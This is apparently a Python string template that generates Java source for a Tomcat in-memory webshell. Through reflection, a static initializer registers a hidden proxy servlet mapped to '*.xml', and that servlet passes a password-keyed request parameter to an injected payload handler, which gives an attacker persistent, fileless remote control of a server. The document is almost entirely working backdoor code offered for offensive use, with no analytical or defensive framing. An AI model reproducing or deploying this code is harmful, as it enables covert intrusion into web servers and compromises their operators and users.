code = """
import java.lang.reflect.*;
import java.util.*;

public class TomcatServlet implements InvocationHandler {{
    private static String pattern = "*.xml";
    private static String password = "{password}";
{common}
{context}
{decoder}
{stub}
    private void hook(Object servletRequest, Object servletResponse)
            throws Exception {{
        String payload = (String) invokeMethod(
            servletRequest, "getParameter", password
        );
        stub(payload, servletRequest, servletResponse);
    }}

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {{
        if (method.getName().equals("service")) {{
            Object servletRequest = args[0];
            Object servletResponse = args[1];
            hook(servletRequest, servletResponse);
        }}
        return null;
    }}

    private void addSevlet(Object proxyObject) throws Exception {{
        Object context = getStandardContext();
        Object wrapper = invokeMethod(context, "createWrapper");
        String name = this.getClass().getName();
        invokeMethod(wrapper, "setServletName", name);
        invokeMethod(wrapper, "setLoadOnStartupString", "1");
        getField(wrapper, "instance").set(wrapper, proxyObject);
        invokeMethod(
            wrapper, "setServletClass", proxyObject.getClass().getName()
        );
        getMethodX(context.getClass(), "addChild", 1).invoke(context, wrapper);
        getMethodX(context.getClass(), "addServletMappingDecoded", 3)
            .invoke(context, pattern, name, false);
    }}

    public TomcatServlet() {{
        synchronized(lock) {{
            Class servletClass = null;
            try {{
                servletClass = Class.forName(
                    "javax.servlet.Servlet"
                );
            }} catch (ClassNotFoundException e) {{
                try {{
                    servletClass = Class.forName(
                        "jakarta.servlet.Servlet"
                    );
                }} catch (ClassNotFoundException ex) {{}}
            }}

            if (servletClass != null) {{
                Object proxyObject = Proxy.newProxyInstance(
                    getLoader(), new Class[]{{servletClass}}, this
                );
                try {{
                    addSevlet(proxyObject);
                }} catch (Exception e) {{}}
            }}
        }}
    }}

    static {{
        new TomcatServlet();
    }}
}}
"""